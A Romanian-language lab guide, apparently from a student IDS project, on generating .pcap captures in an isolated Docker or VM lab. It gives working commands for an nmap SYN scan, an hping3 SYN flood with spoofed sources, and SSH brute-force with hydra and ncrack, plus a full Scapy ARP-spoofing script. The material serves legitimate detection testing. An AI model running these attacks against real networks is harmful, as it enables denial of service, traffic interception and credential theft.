# Generare fișiere .pcap de test — Ghid pas cu pas

> **AVERTISMENT LEGAL ȘI ETIC**
>
> Toate comenzile din acest document simulează atacuri de rețea reale.
> Executarea lor în afara unui mediu de laborator controlat, asupra unor
> sisteme sau rețele fără acordul explicit al proprietarului, constituie
> **infracțiune informatică** în România (Legea 161/2003, art. 42-44),
> în UE (Directiva 2013/40/UE) și în majoritatea jurisdicțiilor.
>
> Rulați **exclusiv** pe mașini proprii, în rețele izolate (fără acces
> la internet sau la alte sisteme), cu scopul strict academic/educativ.
> Autorul și proiectul nu își asumă nicio responsabilitate pentru utilizare
> abuzivă.

---

## Cuprins

1. [Topologia de laborator](#1-topologia-de-laborator)
2. [Opțiunea A — Două mașini virtuale (VirtualBox/VMware)](#opțiunea-a--două-mașini-virtuale)
3. [Opțiunea B — Două containere Docker](#opțiunea-b--două-containere-docker)
4. [Captură de bază cu tcpdump](#2-captură-de-bază-cu-tcpdump)
5. [Atac 1 — TCP SYN Scan](#3-atac-1--tcp-syn-scan-cu-nmap)
6. [Atac 2 — SYN Flood](#4-atac-2--syn-flood-cu-hping3)
7. [Atac 3 — ARP Spoofing](#5-atac-3--arp-spoofing)
8. [Atac 4 — SSH Brute-Force](#6-atac-4--ssh-brute-force)
9. [Colectare și verificare .pcap](#7-colectare-și-verificare-pcap)
10. [Diferența față de trafic sintetic](#8-diferența-față-de-traficul-sintetic)

---

## 1. Topologia de laborator

Avem nevoie de **cel puțin două hosturi** care comunică pe o rețea internă:

```
┌─────────────────┐          Rețea internă         ┌─────────────────┐
│   ATACATOR      │       (izolată, fără NAT)       │   VICTIMĂ       │
│                 │◄───────────────────────────────►│                 │
│  Kali Linux /   │    172.20.0.10 ↔ 172.20.0.20   │  Ubuntu Server  │
│  Parrot OS      │                                 │  (SSH activ)    │
└─────────────────┘                                 └─────────────────┘
        │                                                   │
        └───────────────────────────────────────────────────┘
                    tcpdump rulează pe VICTIMĂ
                    (sau pe un al treilea host/switch mirror)
```

**Adrese IP folosite în exemple:**
- Atacator: `172.20.0.10`
- Victimă:  `172.20.0.20`
- Interfața de rețea (pe victimă): `eth0`

Ajustați adresele și interfața conform mediului vostru.

---

## Opțiunea A — Două mașini virtuale

### VirtualBox

1. Creați două VM-uri (ex. Kali Linux și Ubuntu 22.04 Server).
2. La fiecare VM → **Settings → Network → Adapter 1**:
   - Attached to: **Internal Network**
   - Name: `ids-lab` (același nume la ambele VM-uri)
3. Configurați IP-uri statice pe ambele VM-uri:

```bash
# Pe Atacator (Kali)
ip addr add 172.20.0.10/24 dev eth0
ip link set eth0 up

# Pe Victimă (Ubuntu)
ip addr add 172.20.0.20/24 dev eth0
ip link set eth0 up

# Verificare conectivitate
ping 172.20.0.20   # de pe Atacator
```

4. Pe Victimă — instalați SSH server:
```bash
apt-get update && apt-get install -y openssh-server
systemctl start ssh
# Setați o parolă slabă pentru test (ex. "admin123") la un user de test
useradd -m testuser && echo "testuser:admin123" | chpasswd
```

---

## Opțiunea B — Două containere Docker

Aceasta este opțiunea cea mai rapidă dacă aveți Docker instalat.

### Fișier `lab/docker-compose.yml`

```yaml
version: "3.9"

networks:
  ids-lab:
    driver: bridge
    ipam:
      config:
        - subnet: 172.20.0.0/24

services:
  attacker:
    image: kalilinux/kali-rolling
    container_name: ids-attacker
    networks:
      ids-lab:
        ipv4_address: 172.20.0.10
    cap_add:
      - NET_ADMIN    # necesar pentru hping3, arpspoof, nmap SYN scan
      - NET_RAW
    stdin_open: true
    tty: true
    command: >
      bash -c "apt-get update -qq &&
               apt-get install -y -qq nmap hping3 hydra dsniff iputils-ping &&
               bash"

  victim:
    image: ubuntu:22.04
    container_name: ids-victim
    networks:
      ids-lab:
        ipv4_address: 172.20.0.20
    cap_add:
      - NET_ADMIN
    command: >
      bash -c "apt-get update -qq &&
               apt-get install -y -qq openssh-server tcpdump &&
               useradd -m testuser &&
               echo 'testuser:admin123' | chpasswd &&
               service ssh start &&
               tcpdump -i eth0 -w /captures/capture.pcap &
               sleep infinity"
    volumes:
      - ./captures:/captures
```

### Pornire laborator Docker

```bash
# Din directorul ids_project/lab/
mkdir -p captures
docker-compose up -d

# Shell pe atacator
docker exec -it ids-attacker bash

# Shell pe victimă (pentru monitorizare)
docker exec -it ids-victim bash
```

---

## 2. Captură de bază cu tcpdump

**Pe victimă** (sau pe un host dedicat cu port mirror), rulați tcpdump
**ÎNAINTE** de a lansa orice atac:

```bash
# Captură generică — tot traficul pe eth0
tcpdump -i eth0 -w /tmp/capture_general.pcap

# Captură cu filtru BPF — mai puțin zgomot:
# SYN scan + flood (TCP)
tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0' -w /tmp/capture_syn.pcap

# ARP
tcpdump -i eth0 arp -w /tmp/capture_arp.pcap

# SSH
tcpdump -i eth0 'tcp port 22' -w /tmp/capture_ssh.pcap
```

> **Notă:** Rulați fiecare captură în terminal separat sau în background (`&`).
> Opriți captura cu `Ctrl+C` după terminarea atacului.

---

## 3. Atac 1 — TCP SYN Scan cu nmap

### Ce face

Nmap trimite pachete TCP SYN la fiecare port din intervalul specificat
și analizează răspunsurile (SYN+ACK = deschis, RST = închis, timeout = filtrat).
Nu finalizează niciodată handshake-ul TCP (trimite RST după SYN+ACK).

### Cerințe

```bash
# Pe atacator
apt-get install -y nmap
```

### Comanda exactă

```bash
# Scanare SYN pe porturile 1-1000 (necesită root pentru raw sockets)
nmap -sS \
     -p 1-1000 \
     --scan-delay 0 \
     -T4 \
     172.20.0.20

# Parametri explicați:
#   -sS          → SYN scan (half-open, "stealth")
#   -p 1-1000    → intervalul de porturi scanate
#   --scan-delay 0 → fără pauze între SYN-uri (mai agresiv, mai vizibil)
#   -T4          → timing "Aggressive" (trimite mai repede)
#   172.20.0.20  → IP victimă
```

**Variante pentru a depăși pragul IDS (implicit: 20 porturi în 10s):**

```bash
# Scanare rapidă a 500 porturi — sigur declanșează IDS
nmap -sS -p 1-500 --scan-delay 0 172.20.0.20

# Scanare lentă — sub pragul implicit (exercițiu: creșteți time_window în config)
nmap -sS -p 1-500 --scan-delay 5s 172.20.0.20
```

### Ce să vedeți în Wireshark/tcpdump

- Pachete TCP cu flag `S` (SYN) de la `172.20.0.10` la `172.20.0.20`, porturi 1-1000.
- Fără ACK din partea atacatorului (sau RST imediat după SYN+ACK).
- Rată ridicată de pachete per secundă.

---

## 4. Atac 2 — SYN Flood cu hping3

### Ce face

hping3 trimite un volum masiv de pachete TCP SYN pe un singur port,
umplând SYN queue-ul serverului și cauzând DoS.

### Cerințe

```bash
apt-get install -y hping3
```

### Comanda exactă

```bash
# SYN Flood pe portul 80 al victimei
hping3 \
  --syn \
  --flood \
  --rand-source \
  -p 80 \
  172.20.0.20

# Parametri explicați:
#   --syn          → flag SYN setat
#   --flood        → trimite cât de repede posibil (fără delay)
#   --rand-source  → IP sursă randomizat (simulează DDoS cu IP spoofing)
#   -p 80          → portul destinație (HTTP)
#   172.20.0.20    → IP victimă

# OPRIȚI după 5-10 secunde cu Ctrl+C (suficient pentru a declanșa IDS)
```

**Variantă fără IP spoofing (IP sursă = IP real al atacatorului):**

```bash
hping3 --syn --flood -p 80 172.20.0.20
# Declanșează detectorul per-sursă (SYN_FLOOD)
```

**Variantă cu IP-uri aleatorii (simulează DDoS):**

```bash
hping3 --syn --flood --rand-source -p 80 172.20.0.20
# Declanșează detectorul agregat (SYN_FLOOD_DISTRIBUTED)
```

### Ce să vedeți

- Sute/mii de pachete SYN pe secundă de la IP-uri diferite (cu --rand-source).
- Portul 80 al victimei devine greu de accesat.

---

## 5. Atac 3 — ARP Spoofing

Există două variante: cu `arpspoof` (din pachetul `dsniff`) sau cu Scapy.

### Varianta 5A — arpspoof (dsniff)

```bash
# Pe atacator
apt-get install -y dsniff

# Activăm IP forwarding (pentru a nu întrerupe comunicarea — MitM transparent)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Terminal 1: otrăvim victima (îi spunem că gateway-ul e atacatorul)
# "IP 172.20.0.1 (gateway) are MAC-ul meu"
arpspoof -i eth0 -t 172.20.0.20 172.20.0.1

# Terminal 2 (simultan): otrăvim gateway-ul
# "IP 172.20.0.20 (victima) are MAC-ul meu"
arpspoof -i eth0 -t 172.20.0.1 172.20.0.20

# Parametri:
#   -i eth0         → interfața de rețea a atacatorului
#   -t 172.20.0.20  → target (cel care va fi otrăvit)
#   172.20.0.1      → IP-ul pentru care falsificăm maparea
```

### Varianta 5B — Script Scapy (mai controlabil, mai vizibil în pcap)

```python
#!/usr/bin/env python3
"""
Script Scapy pentru ARP Spoofing în scop de demonstrație în lab.
Trimite Gratuitous ARP Reply-uri care otrăvesc cache-ul ARP al victimei.
"""
import time
from scapy.layers.l2 import ARP, Ether, sendp

ATTACKER_MAC = "aa:bb:cc:dd:ee:ff"   # MAC-ul atacatorului (schimbați!)
VICTIM_IP    = "172.20.0.20"
GATEWAY_IP   = "172.20.0.1"
IFACE        = "eth0"

def spoof(target_ip: str, spoof_ip: str, iface: str) -> None:
    """Trimite ARP Reply: 'spoof_ip are MAC ATTACKER_MAC'."""
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,                    # ARP Reply
        hwsrc=ATTACKER_MAC,      # MAC sursă = atacatorul
        psrc=spoof_ip,           # IP anunțat = IP-ul victimizat (gateway)
        hwdst="ff:ff:ff:ff:ff:ff",
        pdst=target_ip,          # Trimis la victimă
    )
    sendp(pkt, iface=iface, verbose=False)

print("[*] Incep ARP spoofing. Ctrl+C pentru oprire.")
try:
    while True:
        spoof(VICTIM_IP, GATEWAY_IP, IFACE)   # Victima crede că gateway-ul e atacatorul
        spoof(GATEWAY_IP, VICTIM_IP, IFACE)   # Gateway-ul crede că victima e atacatorul
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Oprit.")
```

```bash
# Rulare
python3 arp_spoof_demo.py
```

### Ce să vedeți în pcap

- Pachete ARP cu `op=2` (Reply) de la `aa:bb:cc:dd:ee:ff`.
- Același IP (ex. `172.20.0.1`) anunțat cu un MAC diferit față de cel real.
- IDS-ul alertează la a doua observare a IP-ului cu MAC diferit.

---

## 6. Atac 4 — SSH Brute-Force

### Cerințe

```bash
# Pe atacator
apt-get install -y hydra
# SAU
apt-get install -y ncrack
```

### Varianta 6A — Hydra

```bash
# Brute-force cu listă de parole
hydra \
  -l testuser \
  -P /usr/share/wordlists/rockyou.txt \
  -t 4 \
  -V \
  ssh://172.20.0.20

# Parametri:
#   -l testuser   → username fix (testuser pe victimă)
#   -P rockyou    → lista de parole (Kali: /usr/share/wordlists/rockyou.txt.gz)
#                   decompress: gzip -d rockyou.txt.gz
#   -t 4          → 4 thread-uri paralele (4 conexiuni simultane)
#   -V            → verbose (afișează fiecare încercare)
#   ssh://...     → protocol + IP victimă

# Variantă cu listă mică (pentru test rapid):
echo -e "admin\npassword\n123456\nroot\nadmin123\ntestuser\nqwerty\nletmein\npass\n1234" \
  > /tmp/small_wordlist.txt
hydra -l testuser -P /tmp/small_wordlist.txt -t 4 -V ssh://172.20.0.20
```

### Varianta 6B — ncrack (mai controlabil ca rată)

```bash
ncrack \
  -p 22 \
  --user testuser \
  --pass-file /tmp/small_wordlist.txt \
  -T3 \
  172.20.0.20

# -T3 → timing mediu (0-5, 5 = cel mai rapid)
```

### Ce să vedeți în pcap

- Multe conexiuni TCP SYN de la `172.20.0.10` la `172.20.0.20:22`.
- Handshake TCP completat (SYN → SYN+ACK → ACK) pentru fiecare încercare.
- Urmat de pachetele SSH (criptate, dar sesiunea scurtă = autentificare eșuată).
- IDS-ul detectează la nivel Layer 4 (numără SYN-urile).

---

## 7. Colectare și verificare .pcap

### Oprirea capturii și copierea fișierului

```bash
# Pe victimă — opriți tcpdump
# Dacă rula în background:
kill $(pgrep tcpdump)

# Copiere din container Docker
docker cp ids-victim:/captures/capture_syn.pcap ./captures/

# Verificare cu tshark (dacă e instalat)
tshark -r captures/capture_syn.pcap -q -z io,stat,1
# Afișează statistici per secundă (util pentru vizualizarea spike-urilor)

# Număr pachete per protocol
tshark -r captures/capture_syn.pcap -q -z conv,tcp | head -30
```

### Rularea IDS-ului pe fișierele capturate

```bash
# Din rădăcina proiectului ids_project/
python main.py --pcap captures/capture_syn.pcap
python main.py --pcap captures/capture_arp.pcap
python main.py --pcap captures/capture_ssh.pcap
```

### Verificare vizuală în Wireshark

```
Filtre utile Wireshark:
  tcp.flags.syn == 1 && tcp.flags.ack == 0   → SYN scan / flood
  arp.opcode == 2                              → ARP Reply-uri
  tcp.port == 22                               → trafic SSH
  ip.src == 172.20.0.10                        → tot traficul atacatorului
```

---

## 8. Diferența față de traficul sintetic

Proiectul include și `tools/generate_test_pcap.py` care fabrică pachete
cu Scapy fără rețea reală. Iată diferențele esențiale față de capturile reale:

| Caracteristică | Trafic real (tcpdump) | Trafic sintetic (Scapy) |
|---|---|---|
| **Timestamp-uri** | Timestampuri reale din NIC, variație naturală | Timestampuri setate manual, fixe |
| **TCP sequence numbers** | Generate aleatoriu (ISN + incrementare) | Valoare fixă (0 sau constantă) |
| **TTL / Hop count** | Reflectă topologia reală (decrementat pe fiecare hop) | Valoare implicită Scapy (64) |
| **Window size** | Valoare reală a stivei TCP (ex. 65535, 8192) | Implicită Scapy (8192) |
| **Checksums** | Calculat automat de NIC/OS | Calculat de Scapy (corect) sau dezactivat |
| **Pachetele de răspuns** | Prezente (SYN+ACK de la server, RST etc.) | Absente (doar pachetele atacului) |
| **Trafic de fond** | DNS, ARP normal, DHCP, keepalive-uri etc. | Zero — doar atacul |
| **Fragmente IP** | Posibile pentru payload mare | Absente |
| **Opțiuni TCP** | MSS, SACK, timestamps (negociate real) | Absente (implicit) |
| **Entropie payload** | Conținut real SSH encriptat, HTTP etc. | Payload gol (Raw b"" sau absent) |

**Concluzie practică:**
- Traficul **sintetic** este ideal pentru **testarea logicii de detecție** —
  controlabil 100%, reproductibil, fără zgomot.
- Traficul **real** este esențial pentru **validarea** că IDS-ul funcționează
  și în condiții reale, cu tot zgomotul de fond al unei rețele reale.

Un IDS de producție trebuie testat cu **ambele** tipuri.

---

## Referințe și resurse suplimentare

- [Nmap Reference Guide — SYN Scan](https://nmap.org/book/synscan.html)
- [hping3 man page](https://linux.die.net/man/8/hping3)
- [RFC 793 — TCP](https://www.rfc-editor.org/rfc/rfc793)
- [RFC 826 — ARP](https://www.rfc-editor.org/rfc/rfc826)
- [RFC 4987 — TCP SYN Flooding Attacks and Common Mitigations](https://www.rfc-editor.org/rfc/rfc4987)
- [Scapy Documentation](https://scapy.readthedocs.io/)
- [Wireshark Display Filters](https://wiki.wireshark.org/DisplayFilters)
